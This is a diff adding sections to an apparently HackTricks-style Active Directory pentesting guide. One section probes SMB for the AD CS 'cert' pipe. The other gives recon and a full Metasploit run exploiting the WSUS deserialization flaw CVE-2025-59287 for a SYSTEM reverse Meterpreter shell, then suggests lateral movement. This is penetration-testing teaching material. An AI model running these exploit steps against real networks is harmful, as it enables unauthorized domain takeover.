@@ -779,6 +779,48 @@ rdp-sessions-abuse.md
 
 [**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
 
+## Service Recon & Remote Exploits
+
+### Detecting AD CS over SMB `\\PIPE\\cert`
+
+- The MS-ICPR interface that backs Enterprise CA enrollment exposes the named pipe `cert`. If that pipe is reachable over SMB, the host is almost certainly running Active Directory Certificate Services and publishing certificate templates that can later be abused (ESC1-ESC15, enrollment agent hijacking, etc.).
+- The updated Metasploit [`auxiliary/scanner/smb/pipe_auditor`](https://github.com/rapid7/metasploit-framework/pull/20690) now probes `cert` out of the box together with other high-value pipes. Use it to sweep entire subnets for AD CS without touching LDAP:
+
+```bash
+msf6 > use auxiliary/scanner/smb/pipe_auditor
+msf6 auxiliary(pipe_auditor) > set RHOSTS 10.10.10.0/24
+msf6 auxiliary(pipe_auditor) > set SMBUser corp\\auditor
+msf6 auxiliary(pipe_auditor) > set SMBPass 'Passw0rd!'
+msf6 auxiliary(pipe_auditor) > run
+```
+
+- A hit on `\\PIPE\\cert` means the MS-ICPR RPC endpoint is exposed. Follow up immediately with certificate enumeration tooling such as `Certify.exe find /vulnerable` or `certipy find -vulnerable` against the same host to inventory templates, EKUs and enrollment ACLs.
+- Manual checks are possible when MSF is unavailable: `rpcclient -U 'user%pass' 10.0.0.5 -c "pipeinfo \\PIPE\\cert"` or `smbclient //ca01/IPC$ -U 'user%pass' -c 'open \\PIPE\\cert'` will confirm whether the pipe is exposed. Logging the accessible hosts gives you a prioritized list of machines where AD CS attacks (ESC6, ESC8, web enrollment coercion, etc.) are likely to succeed.
+
+### CVE-2025-59287 – WSUS unauthenticated deserialization RCE
+
+- Microsoft Windows Server Update Services (WSUS) exposes SOAP endpoints (default ports **8530/8531**) that deserialize attacker-supplied .NET objects. CVE-2025-59287 allows unauthenticated callers to send a malicious serialized payload and obtain remote code execution **as `NT AUTHORITY\SYSTEM`** on the WSUS server.
+- Recon: look for hosts with TCP/8530 or TCP/8531 open and grab the `/ClientWebService/server.asmx?wsdl` page. If it answers without authentication you have a reachable WSUS management endpoint and a potential foothold into the domain patching infrastructure:
+
+```bash
+nmap -p 8530,8531 -sV wsus.corp.local
+curl -k https://wsus.corp.local:8531/ClientWebService/server.asmx
+```
+
+- Exploitation is automated in Metasploit via `windows/http/wsus_deserialization_rce`. The module uploads a serialized .NET payload and triggers it through the vulnerable web method, returning a Meterpreter/command shell running as SYSTEM.
+
+```bash
+msf6 > use exploit/windows/http/wsus_deserialization_rce
+msf6 exploit(windows/http/wsus_deserialization_rce) > set RHOSTS wsus.corp.local
+msf6 exploit(windows/http/wsus_deserialization_rce) > set RPORT 8531
+msf6 exploit(windows/http/wsus_deserialization_rce) > set SSL true
+msf6 exploit(windows/http/wsus_deserialization_rce) > set TARGETURI /ClientWebService/server.asmx
+msf6 exploit(windows/http/wsus_deserialization_rce) > set PAYLOAD windows/x64/meterpreter/reverse_https
+msf6 exploit(windows/http/wsus_deserialization_rce) > run
+```
+
+- Tune `TARGETURI`, `SSL`, and `VHOST` to match custom WSUS virtual directories or reverse proxies. Because the WSUS service runs as SYSTEM, a single successful hit provides privileged foothold for lateral movement (e.g., dumping SCCM/WSUS creds, weaponizing update signatures, or pushing AD CS hunting tools).
+
 ## AD -> Azure & Azure -> AD
 
 
@@ -819,5 +861,6 @@ https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-move
 - [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
 - [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
+- [Rapid7 – Metasploit Wrap-Up 11/14/2025](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-11-14-2025)
 
 {{#include ../../banners/hacktricks-training.md}}
